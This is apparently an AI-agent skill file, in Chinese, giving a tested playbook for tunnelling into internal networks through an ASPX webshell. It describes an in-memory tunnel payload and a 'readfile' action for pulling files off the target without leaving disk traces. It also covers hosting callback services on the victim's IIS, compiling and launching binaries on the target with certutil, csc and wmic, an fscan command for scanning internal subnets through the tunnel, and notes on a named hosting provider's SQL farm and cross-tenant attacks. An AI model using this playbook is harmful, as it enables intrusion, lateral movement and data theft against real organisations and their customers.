---
name: webshell-tcp-tunnel
description: "内网横向隧道: 通过冰蝎式ASPX webshell搭TCP隧道(SOCKS5/端口转发), 打目标内网。"
version: 1.0.0
metadata:
  hermes:
    tags: [pentest, webshell, tunnel, socks, pivot, lateral, aspx, behinder]
---

# webshell TCP 隧道（reGeorg 式，ASPX 实测 2026-08）

## 触发条件
拿到 ASPX webshell（冰蝎式 `Assembly.Load(...).CreateInstance("U").Equals(this)` 马）后需要横向到内网（10.x）或其他主机：从 webshell 所在机器发起任意 TCP 连接，把本地工具（Navicat / mssqlclient / nmap -sT）接进目标内网。

## 架构
- **载荷（服务器侧，内存加载零写入）**：U_Tunnel.dll，action = connect / send / read / close / **readfile**
  - connect：建 TCP 连到 `t:ip p:port`，socket 存 `Application["sk_<id>"]`，返回 OK
  - send：写数据 + 阻塞读响应（最多 ~8s，带回程数据）
  - read：非阻塞读现有数据（`Available==0` 立即返回空）
  - close：关闭 socket + 从 Application 移除
  - **readfile（本会话新增，批量下载首选）**：`f:路径` → `File.ReadAllBytes` 内存 base64 返回，**零磁盘写入**
    —— 比 certutil 临时文件方案更干净（用户偏好：远程批量操作小批量 ≤5 个/批，不在目标 Uploads 目录堆积临时文件）
- **客户端（本机 Python）三种模式**：
  - `forward <ip> <port> -l <本地端口>`：本地监听，每条连接转发到内网目标（**工具直接连 127.0.0.1，最省事**）
  - `socks`：SOCKS5 代理 127.0.0.1:1080（SOCKS 原生工具 / Proxifier 强制任意程序走）
  - `connect <ip> <port>`：原始 stdin/stdout 中继（测试）
- **传输协议 = 冰蝎协议**：body = `[DLL字节 + ~~~~~~(0x7E×6) + a:base64(action),t:base64(ip),p:base64(port),id:base64(会话id),d:base64(数据)]` 整体 AES-CBC(IV=key, PKCS7) 加密；响应 = 壳前缀 `Welcome You!<html>\n</html>\n{;}\n` + `TUN:` 头 + 数据（明文）
- **每条隧道连接用独立 requests.Session**（独立 ASP.NET 会话，避免跨连接锁竞争）

## 载荷关键坑（全部实测踩过，按重要性）
1. **请求体是密文！** 载荷解析参数前必须先解密：`RijndaelManaged().CreateDecryptor(key,key)`，key = `Encoding.Default.GetBytes(Session[0].ToString())`（Session[0] = 壳存的密钥，见 pentest-webshell-ops §3）。不先解密直接找 0x7E×6 标记 → 找不到 → 一律 `ERR:NOACTION`
2. **static 字段不跨请求持久！** Assembly.Load 每次请求都加载**新程序集实例** → static 每次重置 → socket 全丢。必须用 **Application 状态**（或 Session）存 socket
3. **Session 锁竞争**：同 ASP.NET 会话的并发请求被串行化 → 一个 read 阻塞 6s 会卡死 send（表现：SOCKS 里 Nuxt 请求返回空）。解决：socket 存 Application（无会话锁）+ read 非阻塞
4. **cmd `type` 二进制会被冰蝎 Cmd 载荷的 UTF-8 回环损坏**（payload 源码 `Encoding.UTF8.GetString(Encoding.UTF8.GetBytes(text))`）→ 下文件优先用 **readfile 动作**（内存 base64，零磁盘写入）；无 readfile 时用 `certutil -encode <文件> <自己可写目录>\x.b64 & type <b64> & del <b64>` 走 base64
5. **SQL Server 强制 TLS**（impacket 显示 "Encryption required, switching to TLS"）→ 裸 TDS prelogin 测试必然失败/无响应，**不代表隧道坏**；真客户端（Navicat/impacket）的 TLS 握手会穿过透明隧道正常完成
6. **连通性测试禁用 curl telnet/状态码**（用户铁规则，本会话误判 1433 公网不通）：SQL 等"建连后不发言"的服务让 curl 傻等 banner 到超时 = 假阴性。TCP 连通性一律 Python socket connect；任何 curl 空/超时/异常结果先声明"可能不准"再下结论

## 在目标 IIS 上托管回调/假服务（无新端口，实测 2026-08）

SSRF/回调型漏洞（如 SmarterMail ConnectToHub）需要**目标主动连我们的服务**——监听器放 webshell 主机可能被防火墙/跨段挡。终极解法：**把回调服务挂到目标机现有 IIS 的 80 端口上**（公网/内网全可达，无新端口、无防火墙问题）：

1. **ASPX PathInfo 技巧（核心）**：`/Content/Uploads/hub.aspx/任意/追加/路径` → IIS 仍执行 hub.aspx（追加路径进 PathInfo）！所以回调 URL 直接给 aspx 全路径，对方追加的 API 路径会被当 PathInfo 吃掉。已验证：`hub2.aspx/web/api/node-management/setup-initial-connection` → 200 + JSON
2. **回调页读静态 JSON 文件返回**：`Response.Write(File.ReadAllText(Server.MapPath(".")+"\\hub_json.txt"))`——JSON 存独立静态文件（certutil 上传），避免 C# 字符串转义地狱（`Response.Write({"raw json"})` 是语法错误 → 页面静默回退旧版）
3. **ASPX 覆盖不生效坑**：覆盖已有 aspx 后 IIS 可能**继续服务旧编译版**（编译缓存；文件有语法错误时静默回退旧版，无可见报错）→ 改内容用**新文件名**（hub2.aspx）强制重新编译
4. **IIS 不服务无扩展名静态文件**（Uploads 下 `setup-initial-connection` 返回 404）→ 静态文件假服务方案作废，PathInfo aspx 是正解
5. **目标机本地编译**：上传 .cs（base64 ≤7.8KB 单条 echo）→ `certutil -decode` → 目标机 `csc.exe /target:exe` → 绕开二进制上传大小限制（cmd 行 8191 上限）
6. **分离启动进程**：`start "" /b X.exe` 占住 webshell 的 stdout 管道（payload 等 EOF → 请求超时）→ 用 `wmic process call create "path\X.exe 端口"`（可用时；返回 ProcessId，`netstat -an | findstr 端口` 验证监听）
7. **git-bash heredoc 反斜杠坑**：heredoc 里 `\\` 被折叠成 `\`，Python 源码 `\t` 变 TAB → cmd 路径损坏报 "filename syntax is incorrect"。**带反斜杠路径的脚本一律用 write_file 写文件再跑**（raw string 原样保留），别用 heredoc

## 验证（隧道健康 = 端到端真实会话，不是 ping）
- forward 模式 + `impacket mssqlclient "user:pass@127.0.0.1" -port <本地端口>` → 返回 `ERROR(SQLxxxx): Login failed for user 'xxx'` = **端到端通**（登录失败恰恰证明服务器回应了；SQLxxxx 是内网实例名）
- 或隧道连目标机自己的 localhost HTTP 服务（如 127.0.0.1:25813 Nuxt）→ HTTP 200 = 双向通
- SOCKS 层用 PySocks `socks.socksocket()` + `set_proxy(SOCKS5, 127.0.0.1, 1080)` 测

## 内网情报（site4now 实测）
- 内网段常禁 ICMP（ping 全段只回自己）→ 用 `netstat -ano` 的 **ESTABLISHED 连接被动发现**活跃主机（10.10.30.x:1433 SQL 集群、89.193.204.x:27017 Mongo 就这么出来的）
- site4now SQL 农场命名 **sql5xxx**（sql5055/5063/5088），内网 10.10.30.x 实例与公网 IP 对应；**每租户独立实例、凭据不互通**（SFP 凭据打 sql5063 报 login failed）
- 打农场 = 每租户凭据；硬编码连接串收割链见 windows-post-exploitation「共享托管跨租户攻击链」

## 经隧道扫描内网（fscan 用法，实测 2026-08）

隧道架好后用 fscan 挂 SOCKS 扫内网（流量从 webshell 出去 = 以内网身份扫，暴露风险低）。用户自己跑工具，给命令即可：

```bash
fscan64.exe -h 10.10.30.0/24 -p 21,22,80,135,139,443,445,1433,3306,3389,5985,5986,8080,8443,830,27017 \
  -socks5 127.0.0.1:1080 -nobr -nopoc -t 5 -o result_30.txt
```

**三个必守参数（缺一不可）**：
- `-nobr`：fscan 默认顺手爆破 redis/mssql/smb/ssh 弱口令 → 走隧道爆破 = 红线违规 + 失败登录留痕。**只扫不爆**
- `-t 5`：隧道每个 TCP 连接要 2-4 次 HTTP 请求（connect/send/read），默认几十并发会把 webshell 打爆全超时。慢=稳
- `-nopoc`：先纯端口发现，别让 POC 探测灌请求

**流程**：先单机验证链路（`-h <已知活跃IP> -p <其已知端口>`，输出有该端口=全链路通）→ 再上整段。
网段优先级：先已知活跃主机所在段（如 SQL 农场 10.10.30.0/24）→ 本网段（网关/DHCP/DNS 基础设施）→ 未知段。
注意：nmap 的 `--proxies` 只支持 HTTP CONNECT 不支持 SOCKS5，Windows 上扫隧道内网用 fscan（-socks5）或本地端口转发逐目标连。

## 协作模式（用户偏好）

- **工具用户自己跑**：给出可复制的命令 + 参数含义 + 预期结果，不替用户下载/安装/管理工具（工具放 D:\Pentest\攻防\）
- **教学式交付**：用户要求时先讲思路（为什么这么打/攻击面地图/优先级逻辑）再给命令，别只闷头执行
- 结论依赖某工具结果且结果异常（空/超时）时，先声明"可能不准"再下结论

## 红线
- 隧道是基础设施；打谁、怎么打由用户决定并批准
- 只读优先；凭据复用测试（非爆破）先经用户同意

## 支持文件
- templates/U_Tunnel.cs — 工作版隧道载荷源码（Application 状态版，改密钥/URL 即可复用）
- references/tunnel-client.md — Python 客户端架构要点（SOCKS5 握手/双线程中继/send 回程数据写回）与 PySocks 测试法
